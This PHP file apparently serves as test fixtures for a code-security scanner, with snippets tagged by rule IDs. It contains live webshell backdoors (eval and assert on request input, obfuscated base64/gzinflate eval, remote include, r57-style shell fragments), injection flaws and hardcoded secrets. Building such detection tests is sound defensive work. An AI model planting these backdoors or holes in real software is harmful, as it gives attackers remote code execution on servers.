<?php
$username = $_POST['username'];
$password = $_POST['password'];
$callback = $_POST['callback'];

$target = "10.11.2.220";

$cmd = $_REQUEST['a'];

echo ($callback . ";");
echo $callback;

extract($cmd);

@array_map("ass\x65rt", (array) @$cmd);

$cmd = $_GET['cmd'];

if (!empty($cmd)) {
	eval($cmd);
	system('ls'+$cmd);
}

if (isset($_GET['sid'])) {
	setcookie("PHPSESSID", $cmd);
}

phpinfo();

if (!empty($url)) {
	mkdir('log/' . date("Y"), 0777);
}

// cvi-120001
function curl($url) {
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_HEADER, 0);
	curl_exec($ch);
	curl_close($ch);
}

$url = $_GET['url'];
if (!empty($url)) {
	curl($cmd);
}

$url = $_GET['url'];

if (!empty($url)) {
	$content = file_get_contents($url);
}

$url = $_GET["url"];
if (!empty($url)) {
	echo get_headers($url, 1);
}

print("Hello " . $cmd);

$query = "SELECT id, name, inserted, size FROM products WHERE size = '$size' ORDER BY $order LIMIT $limit, $offset;";
mysql_query($query);
mysqli_query($query);

if (!empty($cmd)) {
	require_once $cmd;
}

highlight_file($cmd);

$unique = uniqid();

$appKey = "C787AFE9D9E86A6A6C78ACE99CA778EE";

$password = "cobra123456!@#";

$url = $_GET["url"];
if (!empty($url)) {
	header("Location: " . $url);
}

$test     = $_POST['test'];
$test_uns = unserialize($test);

$xml  = $_POST['xml'];
$data = simplexml_load_string($xml);

parse_str($_SERVER['QUERY_STRING']);

$a = '0';

if ($a == 1) {
	echo "true!";
} else {
	echo "false!";
}

$file = $_POST["file_name"];
if (!empty($file)) {
	unlink($file);
}

header("Location: " . $_GET["url"]);

$host = $_POST['host'];
$port = $_POST['port'];
function GetFile($host, $port, $link) {
	$fp = fsockopen($host, intval($port), $errno, $errstr, 30);
	if (!$fp) {
		echo "$errstr (error number $errno) \n";
	} else {
		$out = "GET $link HTTP/1.1\r\n";
		$out .= "Host: $host\r\n";
		$out .= "Connection: Close\r\n\r\n";
		$out .= "Connection: Close\r\n\r\n";
		$out .= "\r\n";
		fwrite($fp, $out);
		$contents = '';
		while (!feof($fp)) {
			$contents .= fgets($fp, 1024);
		}
		fclose($fp);
		return $contents;
	}
}

//cvi-165001
$surname = $_GET['surname'];
$filter  = "(sn=" . $surname . ")";
$sr      = ldap_search($ds, "o=My Company, c=US", $filter);
$info    = ldap_get_entries($ds, $sr);

//cvi-360001
include "sss.jpg";

//cvi-360037
$a = "http://www.test.com/sss.php";
require_once $a;

//cvi-360002
array_filter($arr, base64_decode("ZXZhbA=="));

//cvi-360003
$e = "eval";
array_filter($arr, $e);

//cvi-360004
echo @preg_replace('/xx/e', $_POST[sss], axxa);

//cvi-360005
($e = $_POST['e']) && @preg_replace($e, "eval", 'hello');

//cvi-360006
($code = $_POST['code']) && @preg_replace('/ad/e', '@' . str_rot13('riny') .'($code)', 'add');

//cvi-360007
//call_user_func('assert', $_REQUEST['pass']); //这种和参数可控重复  同理加密的字符串检测不出来
//call_user_func('assert', $arr);

//cvi-360008
$a = 'assert';
call_user_func($a, $arr);

//cvi-360009
$db = new SQLite3('sqlite.db3');
$db->createFunction('myfunc', $_POST['e']);

//cvi-360010
$e  = $_REQUEST['e'];
$db = new SQLite3('sqlite.db3');
$db->createFunction('myfunc', $e);
$stmt = $db->prepare("SELECT myfunc(?)");
$stmt->bindValue(1, $_REQUEST['pass'], SQLITE3_TEXT);
$stmt->execute();

//cvi-360011
$sa = create_function('xxx', "eval()");$sa();

//cvi-360012
$func=@create_function('$x','ev'.'al'.'(gz'.'inf'.'late'.'(bas'.'e64'.'_de'.'co'.'de($x)));');$func($_GET['func']);

//cvi-360013
//$id = $_GET['id'];$q = 'echo' . $id . 'is' . $a . ";";$sy = create_function('$a', $q);
$sa = "eval()"; create_function('xxx', $sa);

//cvi-360014
$a = "eval";$a($_GET['a']);

//cvi-360015 感觉有误报的
if ($dbhandle = sqlite_open('mysqlitedb', 0666, $sqliteerror)) {
	sqlite_create_function($dbhandle, 'func', 'eval($cmd);', 1);
} else {
	echo 'Error opening sqlite db: ' . $sqliteerror;exit;
}

//cvi-360016
filter_var_array(array('test' => $_REQUEST['pass']), array('test' => array('filter' => FILTER_CALLBACK, 'options' => 'assert')));

//cvi-360017
$op = array('options' => 'assert');
filter_var($_REQUEST['pass'], FILTER_CALLBACK, $op);

//cvi-360018
mb_ereg_replace('.*', $_REQUEST['op'], '', 'e');

//cvi-360019
$e = "\ise";
$data = mb_ereg_replace("/[^A-Za-z0-9\.\-]/", "", $data, $e);

//cvi-360020
array_walk($array, "eval");

//cvi-360021
$a = "ZXZhbA==";array_walk($array, base64_decode($a));

//cvi-360022
ini_set('allow_url_include, 1'); // Allow url inclusion in this script
include 'php://input';

//cvi-360026
$cb = 'system';
ob_start($cb);
echo $_GET[c];
ob_end_flush();

//cvi-360028
eval(base64_decode(
ZXZhbChiYXNlNjRfZGVjb2RlKFpYWmhiQ2hpWVhObE5qUmZaR1ZqYjJSbEtFeDVPRGhRTTBKdlkwRndiR1J0Um5OTFExSm1WVVU1VkZaR2RHdGlNamw1V0ZOclMweDVPQzVqYUhJb05EY3BMbEJuS1NrNykpOw));

//cvi-360032
//<div class = bartitle><h4> '.sh_name().' </h4>  .:r57 . bizDq99Shell:.</div>

//cvi-360033
$shver = "Emp3ror Undetectable #18"; //Current version
//CONFIGURATION AND SETTINGS
if (!empty($unset_surl)) {setcookie("N3tsh_surl");
	$surl = "";
} elseif (!empty($set_surl)) {$surl = $set_surl;
	setcookie("N3tsh_surl", $surl);} else { $surl = $_REQUEST["N3tsh_surl"];} //Set this cookie for manual SURL

//cvi-360034
$_POST['sa']($_POST['sb']);

//cvi-360035
$func = new ReflectionFunction($_GET[m]);
echo $func->invokeArgs(array($_GET[c], $_GET[id]));

//cvi-360036
$a = 'assert';
$arr = new ArrayObject(array('test', $_REQUEST['pass']));
$arr->uasort($a);
